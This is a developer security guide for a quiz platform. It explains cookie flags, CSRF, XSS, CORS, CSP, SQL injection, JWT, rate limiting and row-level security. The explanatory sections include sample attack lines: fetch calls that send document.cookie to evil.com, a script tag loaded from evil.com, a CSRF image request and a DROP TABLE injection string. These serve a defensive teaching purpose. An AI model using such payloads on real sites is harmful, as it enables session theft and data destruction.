# Security Guide - Quiz Management Platform

## Table of Contents
1. [Security Overview](#security-overview)
2. [Understanding Security Concepts](#understanding-security-concepts)
3. [Implemented Security Measures](#implemented-security-measures)
4. [Security Checklist](#security-checklist)
5. [Common Attack Vectors & Defenses](#common-attack-vectors--defenses)
6. [Production Deployment Security](#production-deployment-security)

---

## Security Overview

This application implements **defense in depth** - multiple layers of security that work together to protect against various attack vectors. Even if one layer is compromised, others remain intact.

### Security Layers
1. **Network Layer**: HTTPS, CORS, CSP
2. **Application Layer**: Authentication, authorization, input validation
3. **Database Layer**: Row-Level Security (RLS), SQL injection prevention
4. **Transport Layer**: Secure cookies, encrypted connections

---

## Understanding Security Concepts

### 🍪 Cookie Security

**What are cookies?**
Small pieces of data stored in the user's browser that are sent with every request to the server.

**Security Flags:**

#### 1. HttpOnly Flag
```typescript
httpOnly: true
```
- **What it does**: Prevents JavaScript from accessing the cookie
- **Why it matters**: Protects against XSS (Cross-Site Scripting) attacks
- **Attack scenario without HttpOnly**:
  ```javascript
  // Malicious script injected into your site:
  const stolenToken = document.cookie  // Can steal auth token!
  fetch('https://evil.com/steal?cookie=' + stolenToken)
  ```
- **With HttpOnly**: The above script returns empty - JavaScript cannot access the cookie

#### 2. Secure Flag
```typescript
secure: process.env.NODE_ENV === 'production'
```
- **What it does**: Cookie only sent over HTTPS connections
- **Why it matters**: Prevents man-in-the-middle (MITM) attacks
- **Attack scenario without Secure**:
  - User connects to WiFi at a coffee shop
  - Attacker intercepts HTTP traffic
  - Auth cookie sent in plain text → stolen!
- **With Secure**: Cookie never sent over HTTP, only HTTPS (encrypted)

#### 3. SameSite Flag
```typescript
sameSite: 'strict'
```
- **What it does**: Controls when cookies are sent with cross-site requests
- **Options**:
  - `strict`: Cookie NEVER sent on cross-site requests
  - `lax`: Cookie sent on top-level navigation (clicking links)
  - `none`: Cookie always sent (requires Secure flag)
- **Why it matters**: Prevents CSRF (Cross-Site Request Forgery) attacks

---

### 🛡️ CSRF (Cross-Site Request Forgery)

**What is CSRF?**
An attack where a malicious website tricks your browser into making unwanted requests to a site where you're authenticated.

**Attack Example:**
```html
<!-- Evil website: evil.com -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000">
```

If you're logged into yourbank.com, your browser automatically sends your auth cookie with this request!

**Our Defense:**
1. **SameSite=strict cookies**: Browser won't send cookie from evil.com
2. **Bearer token authentication**: Tokens in Authorization header aren't automatically sent
3. **CORS**: Blocks cross-origin requests from unauthorized domains

**Why our app is safe:**
- We use `Authorization: Bearer <token>` headers for API requests
- CSRF attacks can't access headers (only cookies)
- SameSite=strict adds extra protection

---

### 🚨 XSS (Cross-Site Scripting)

**What is XSS?**
Injecting malicious JavaScript code into web pages viewed by other users.

**Types of XSS:**

#### 1. Stored XSS
```javascript
// Attacker submits this as a test title:
const maliciousTitle = '<script>fetch("https://evil.com/steal?cookie=" + document.cookie)</script>'

// Without proper escaping, this runs in admin panel when viewing test!
```

#### 2. Reflected XSS
```
https://yoursite.com/search?q=<script>alert('hacked')</script>
```

#### 3. DOM-based XSS
```javascript
// Dangerous code:
element.innerHTML = userInput  // DON'T DO THIS!
```

**Our Defenses:**

1. **React Auto-Escaping**
   ```tsx
   <h1>{userTitle}</h1>  // Automatically escaped - SAFE
   ```

2. **HttpOnly Cookies**
   - Even if XSS occurs, attacker can't steal auth token

3. **Content Security Policy (CSP)**
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self'
   ```
   - Blocks inline scripts like `<script>alert('xss')</script>`
   - Only allows scripts from our domain

4. **Input Sanitization** (NEW - December 2025)
   **Location:** `backend-api/src/utils/sanitize.ts`
   ```typescript
   import DOMPurify from 'isomorphic-dompurify'
   
   export function sanitizeText(dirty: string): string {
     return DOMPurify.sanitize(dirty, {
       ALLOWED_TAGS: [],    // No HTML tags allowed
       ALLOWED_ATTR: []     // No attributes allowed
     })
   }
   ```
   - Strips ALL HTML from user input before storing in database
   - Applied to: question prompts, option labels, test titles, descriptions
   - Even if React escaping fails, data is clean at source

5. **Input Validation (Joi)**
   ```typescript
   const schema = Joi.object({
     title: Joi.string().max(200)  // Length limits prevent large payloads
   })
   ```

6. **Token Format Validation** (NEW - December 2025)
   **Location:** `student-app/lib/api/client.ts`
   ```typescript
   private isValidJwtFormat(token: string): boolean {
     const jwtRegex = /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/
     return jwtRegex.test(token)
   }
   ```
   - Validates JWT format before storing in localStorage
   - Rejects malformed or malicious tokens

---

### 🌐 CORS (Cross-Origin Resource Sharing)

**What is CORS?**
A security mechanism that controls which domains can access your API from a browser.

**The Problem:**
```javascript
// From https://evil.com, attacker tries:
fetch('https://your-api.com/users')
  .then(r => r.json())
  .then(data => steal(data))
```

**Our Solution:**
```typescript
const allowedOrigins = ['http://localhost:3000', 'https://admin.yourdomain.com']

app.use(cors({
  origin: (origin, callback) => {
    if (allowedOrigins.includes(origin)) {
      callback(null, true)  // Allow
    } else {
      callback(new Error('Not allowed by CORS'))  // Block
    }
  }
}))
```

**Important CORS Headers:**

1. **Access-Control-Allow-Origin**
   - Specifies which domains can access the API
   - We use a whitelist approach

2. **Access-Control-Allow-Credentials**
   - Allows cookies to be sent with requests
   - Must be `true` for our cookie-based auth

3. **Access-Control-Allow-Methods**
   - Specifies allowed HTTP methods (GET, POST, etc.)

**Why it matters:**
- Prevents evil.com from calling your API from user's browser
- Without CORS, any website could access your API

---

### 🔐 Content Security Policy (CSP)

**What is CSP?**
HTTP headers that tell the browser what resources are allowed to load.

**Our Configuration (Updated December 2025):**
**Location:** `backend-api/src/index.ts` (lines 30-65)
```typescript
contentSecurityPolicy: {
  directives: {
    defaultSrc: ["'self'"],           // Only load resources from our domain
    scriptSrc: ["'self'"],            // Only run scripts from our domain
    styleSrc: ["'self'", "'unsafe-inline'"],  // Styles from us (inline needed for frameworks)
    imgSrc: ["'self'", "data:", "https://*.supabase.co"],  // Images from us or Supabase
    connectSrc: ["'self'", "https://*.supabase.co", "https://*.upstash.io"],  // API calls
    fontSrc: ["'self'", "data:", "https://fonts.gstatic.com"],  // Fonts
    objectSrc: ["'none'"],            // No Flash/plugins
    frameSrc: ["'none'"],             // No iframes allowed
    baseUri: ["'self'"],              // Prevents <base> tag hijacking (NEW)
    formAction: ["'self'"],           // Restricts form submissions (NEW)
    upgradeInsecureRequests: []        // Forces HTTP → HTTPS (NEW)
  }
}
```

**New CSP Directives Explained:**
- `baseUri: ["'self'"]` - Prevents attackers from changing the base URL for relative links
- `formAction: ["'self'"]` - Prevents forms being submitted to external sites
- `upgradeInsecureRequests` - Automatically upgrades HTTP requests to HTTPS

**Attack Scenarios Prevented:**

1. **Inline Script Injection**
   ```html
   <img src=x onerror="alert('xss')">  <!-- BLOCKED by CSP -->
   ```

2. **External Script Loading**
   ```html
   <script src="https://evil.com/steal.js"></script>  <!-- BLOCKED -->
   ```

3. **Data Exfiltration**
   ```javascript
   fetch('https://evil.com/steal', {body: secretData})  // BLOCKED (not in connectSrc)
   ```

---

### 🔒 SQL Injection

**What is SQL Injection?**
Injecting malicious SQL code into database queries.

**Classic Attack:**
```javascript
// Vulnerable code (we DON'T do this):
const query = `SELECT * FROM users WHERE email = '${userInput}'`

// Attacker inputs:
userInput = "' OR '1'='1'; DROP TABLE users; --"

// Resulting query:
// SELECT * FROM users WHERE email = '' OR '1'='1'; DROP TABLE users; --'
// This returns all users AND deletes the table!
```

**Our Defense:**

1. **Parameterized Queries** (via Supabase SDK)
   ```typescript
   // SAFE - Supabase handles escaping:
   const { data } = await supabase
     .from('users')
     .select('*')
     .eq('email', userInput)  // Automatically parameterized
   ```

2. **ORM/Query Builder**
   - We never write raw SQL with user input
   - Supabase SDK prevents SQL injection

3. **Input Validation**
   ```typescript
   email: Joi.string().email()  // Must be valid email format
   ```

---

### 🎫 JWT (JSON Web Tokens)

**What is JWT?**
A secure way to transmit information between parties as a JSON object.

**Structure:**
```
header.payload.signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMTIzIiwicm9sZSI6ImFkbWluIn0.SIGNATURE
```

**How it works:**
1. User logs in with email/password
2. Server verifies credentials
3. Server creates JWT signed with secret key
4. Client stores JWT
5. Client sends JWT with each request
6. Server verifies signature to authenticate

**Security Features:**

1. **Tamper-Proof**
   ```javascript
   // If attacker changes role from 'user' to 'admin':
   // Signature verification fails → rejected!
   ```

2. **Stateless**
   - Server doesn't need to store sessions
   - Scales better

3. **Expiration**
   ```json
   {
     "user_id": "123",
     "exp": 1735689600  // Expires after 7 days
   }
   ```

**Our Implementation:**
- Supabase manages JWT creation and verification
- Tokens expire after 7 days
- Refresh tokens allow seamless re-authentication

---

### 🚦 Rate Limiting

**What is Rate Limiting?**
Restricting the number of requests a user can make in a time window.

**Location:** `backend-api/src/middleware/rateLimit.middleware.ts`

**Why it matters:**

1. **Brute Force Prevention**
   ```typescript
   // Without rate limiting:
   for (let i = 0; i < 1000000; i++) {
     try {
       await login('admin@example.com', passwords[i])
     } catch {}
   }
   // Attacker tries 1 million passwords!
   ```

2. **DoS Prevention**
   - Prevents one user from overwhelming the server

3. **Resource Protection**
   - Expensive operations (like OTP sending) limited

**Our Configuration (Updated December 2025):**

```typescript
// Login attempts: 5 per 15 minutes per IP
authLimiter: { max: 5, windowMs: 15 * 60 * 1000, skipSuccessfulRequests: true }

// OTP sending: 3 per 15 minutes (prevents SMS spam)
otpLimiter: { max: 3, windowMs: 15 * 60 * 1000 }

// General API: 500 per 15 minutes
apiLimiter: { max: 500, windowMs: 15 * 60 * 1000 }

// Test attempts: 50 per hour PER USER (not per IP!) - NEW
attemptLimiter: { 
  max: 50, 
  windowMs: 60 * 60 * 1000,
  keyGenerator: (req) => req.user?.id || req.ip  // User-based, not IP-based
}
```

**User-Based Rate Limiting (NEW):**
- Test attempts are now tracked per authenticated user, not per IP
- This is fairer for schools/offices with shared IPs
- 100 students can each take 50 tests/hour from same network

**Response when limit exceeded:**
```json
{
  "error": "Too many requests, please try again later.",
  "retryAfter": 900
}
```

---

### 🗄️ Row-Level Security (RLS)

**What is RLS?**
Database-level access control that enforces policies on every query.

**Example Policy:**
```sql
CREATE POLICY "Users can only read their own attempts"
ON attempts FOR SELECT
USING (auth.uid() = user_id);
```

**Why it's powerful:**

1. **Cannot be bypassed by code bugs**
   ```typescript
   // Even if developer makes a mistake:
   const { data } = await supabase.from('attempts').select('*')
   // Database STILL filters to only show user's own attempts!
   ```

2. **Defense in depth**
   - API validation can fail, but RLS always enforces

3. **Granular control**
   ```sql
   -- Admins see everything:
   CREATE POLICY "Admins can manage all" ON tests
   USING (EXISTS (
     SELECT 1 FROM profiles WHERE id = auth.uid() AND role = 'admin'
   ));
   ```

---

### 🔍 Input Validation

**Why validate input?**

1. **Prevent injection attacks** (XSS, SQL injection)
2. **Enforce business rules** (e.g., test title 3-200 chars)
3. **Improve data quality**
4. **Provide better error messages**

**Our Approach - Joi Validation:**

```typescript
const testSchema = Joi.object({
  title: Joi.string()
    .min(3)
    .max(200)
    .trim()
    .required()
    .messages({
      'string.min': 'Test title must be at least 3 characters',
      'string.max': 'Test title must not exceed 200 characters'
    }),

  time_limit: Joi.number()
    .integer()
    .min(1)
    .max(36000)  // Max 10 hours
    .allow(null)
})
```

**What this prevents:**

```typescript
// Attack attempt 1: Buffer overflow
{ title: 'A'.repeat(1000000) }  // BLOCKED - exceeds max length

// Attack attempt 2: Script injection
{ title: '<script>alert("xss")</script>' }  // SANITIZED - React escapes it

// Attack attempt 3: Negative time
{ time_limit: -1 }  // BLOCKED - below minimum

// Attack attempt 4: Extra fields (mass assignment)
{ title: 'Test', role: 'admin' }  // BLOCKED - stripUnknown: true
```

---

## Implemented Security Measures

### ✅ Authentication & Authorization
- [x] JWT-based authentication via Supabase Auth
- [x] Role-based access control (admin/user)
- [x] Server-side token validation on every request
- [x] Middleware protection on frontend routes
- [x] Password hashing (bcrypt via Supabase)

### ✅ Cookie Security
- [x] HttpOnly flag (prevents XSS token theft)
- [x] Secure flag (HTTPS only in production)
- [x] SameSite=strict (CSRF protection)
- [x] Server-side cookie setting
- [x] Secure cookie clearing on logout

### ✅ CORS Protection
- [x] Origin whitelist
- [x] Credentials support
- [x] Preflight caching
- [x] Environment-based configuration

### ✅ Content Security Policy
- [x] Restrictive CSP headers
- [x] Script-src limited to 'self'
- [x] No inline scripts allowed
- [x] Frame ancestors blocked
- [x] Supabase domains whitelisted

### ✅ Rate Limiting
- [x] Login rate limiting (5/15min)
- [x] OTP rate limiting (3/15min)
- [x] General API rate limiting (500/15min)
- [x] Test attempt limiting (50/hour per USER) - **NEW**
- [x] Redis-backed via Upstash (production connected)
- [x] User-based tracking for attempts (fairer than IP-based) - **NEW**

### ✅ Input Validation
- [x] Joi validation schemas for all endpoints
- [x] Email format validation
- [x] Password strength requirements
- [x] UUID format validation
- [x] Length limits on all text fields
- [x] Type coercion and sanitization
- [x] Unknown field stripping

### ✅ Database Security
- [x] Row-Level Security on all tables
- [x] Parameterized queries (via Supabase SDK)
- [x] Foreign key constraints
- [x] Check constraints on enums
- [x] Security definer functions

### ✅ Additional Headers
- [x] HSTS (HTTP Strict Transport Security)
- [x] X-Frame-Options: DENY
- [x] X-Content-Type-Options: nosniff
- [x] X-XSS-Protection
- [x] Referrer-Policy: strict-origin-when-cross-origin - **NEW**
- [x] Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=() - **NEW**

### ✅ XSS Protection (NEW - December 2025)
- [x] Input sanitization with DOMPurify (`backend-api/src/utils/sanitize.ts`)
- [x] Sanitization on question prompts, options, test titles/descriptions
- [x] JWT token format validation before localStorage storage
- [x] Enhanced CSP with baseUri, formAction, upgradeInsecureRequests
- [x] React auto-escaping (no dangerouslySetInnerHTML used)

### ✅ Error Handling
- [x] No stack traces in production
- [x] Generic error messages (no info leakage)
- [x] Proper HTTP status codes
- [x] Centralized error handling

### ✅ Logging & Monitoring
- [x] Request logging (Morgan)
- [x] Environment indicators
- [x] Health check endpoint
- [x] Redis connection status

---

## Security Checklist

### Development
- [ ] Never commit `.env` files
- [ ] Use `.env.example` for templates
- [ ] Keep dependencies updated (`npm audit`)
- [ ] Review code for security issues
- [ ] Test authentication flows
- [ ] Validate all user inputs

### Pre-Production
- [ ] Change all default secrets
- [ ] Update CORS_ORIGIN to production domains
- [ ] Set NODE_ENV=production
- [ ] Enable HTTPS/SSL
- [ ] Configure firewall rules
- [ ] Set up monitoring/alerting
- [ ] Backup database
- [ ] Test rate limiting

### Production
- [ ] Monitor error logs daily
- [ ] Regular security audits
- [ ] Keep dependencies updated
- [ ] Review access logs for suspicious activity
- [ ] Rotate secrets quarterly
- [ ] Test backup restoration
- [ ] Performance monitoring

---

## Common Attack Vectors & Defenses

| Attack | Description | Our Defense |
|--------|-------------|-------------|
| **Brute Force** | Trying many passwords | Rate limiting (5 attempts/15min) |
| **XSS** | Injecting malicious scripts | React escaping + CSP + HttpOnly cookies |
| **CSRF** | Forcing unwanted actions | SameSite cookies + Bearer tokens |
| **SQL Injection** | Malicious database queries | Parameterized queries + RLS |
| **Session Hijacking** | Stealing session tokens | HttpOnly + Secure cookies + HTTPS |
| **Clickjacking** | Tricking users to click hidden elements | X-Frame-Options: DENY |
| **MITM** | Intercepting traffic | HTTPS + HSTS + Secure cookies |
| **DoS** | Overwhelming server | Rate limiting + pagination |
| **Mass Assignment** | Extra fields in requests | Joi stripUnknown + explicit field selection |
| **Privilege Escalation** | Gaining unauthorized access | RLS + role checks + middleware |

---

## Production Deployment Security

### Environment Variables

**Critical Production Settings:**
```bash
NODE_ENV=production  # Enables production optimizations
CORS_ORIGIN=https://admin.yourdomain.com,https://app.yourdomain.com
```

### SSL/TLS Configuration

**Minimum Requirements:**
- TLS 1.2 or higher
- Valid SSL certificate (Let's Encrypt, DigiCert, etc.)
- Certificate auto-renewal
- Redirect HTTP → HTTPS

**Verification:**
```bash
curl -I https://your-api.com/health
# Should return:
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

### Firewall Rules

**Recommended Setup:**
```
Allow:
- Port 443 (HTTPS) from anywhere
- Port 22 (SSH) from specific IPs only

Block:
- Port 80 (HTTP) - redirect to 443
- All other ports
```

### Database Security

1. **Network Isolation**
   - Database not publicly accessible
   - Only API server can connect

2. **Connection Security**
   - Use connection pooling
   - SSL/TLS for database connections
   - Strong database passwords

3. **Backup Strategy**
   - Daily automated backups
   - Point-in-time recovery enabled
   - Test restoration regularly

### Monitoring & Alerts

**What to monitor:**
- Failed login attempts (spike = brute force attack)
- Rate limit hits
- 4xx/5xx error rates
- Response times
- Database connection errors
- Disk space usage

**Alert Thresholds:**
- More than 50 failed logins in 5 minutes
- Error rate > 5%
- Response time > 5 seconds
- Disk usage > 80%

### Regular Maintenance

**Weekly:**
- Review error logs
- Check for suspicious activity
- Monitor resource usage

**Monthly:**
- Update dependencies (`npm audit fix`)
- Review access logs
- Security scan (OWASP ZAP, etc.)

**Quarterly:**
- Rotate secrets and keys
- Full security audit
- Penetration testing
- Review and update policies

---

## Security Resources

### Learning Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Web Security Academy](https://portswigger.net/web-security)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)

### Testing Tools
- [OWASP ZAP](https://www.zaproxy.org/) - Security scanner
- [Burp Suite](https://portswigger.net/burp) - Penetration testing
- [npm audit](https://docs.npmjs.com/cli/v8/commands/npm-audit) - Dependency vulnerabilities

### Helpful Commands
```bash
# Check for dependency vulnerabilities
npm audit

# Fix automatic vulnerabilities
npm audit fix

# Test CORS configuration
curl -H "Origin: https://evil.com" https://your-api.com/health

# Test rate limiting
for i in {1..10}; do curl https://your-api.com/api/auth/login; done
```

---

## Support

If you discover a security vulnerability, please email security@yourdomain.com.

**Do NOT open a public issue for security vulnerabilities.**

---

## Quick Reference: Security File Locations

| Security Feature | File Location |
|-----------------|---------------|
| **CSP & Helmet** | `backend-api/src/index.ts` (lines 30-65) |
| **CORS Whitelist** | `backend-api/src/index.ts` (lines 70-100) |
| **Rate Limiting** | `backend-api/src/middleware/rateLimit.middleware.ts` |
| **Input Sanitization** | `backend-api/src/utils/sanitize.ts` |
| **Auth Middleware** | `backend-api/src/middleware/auth.middleware.ts` |
| **Joi Validators** | `backend-api/src/validators/*.ts` |
| **RLS Policies** | `supabase/migrations/*.sql` |
| **Token Validation** | `student-app/lib/api/client.ts` (lines 25-40) |
| **Redis Config** | `backend-api/src/config/redis.ts` |

---

**Last Updated**: December 2025
**Version**: 2.0.0
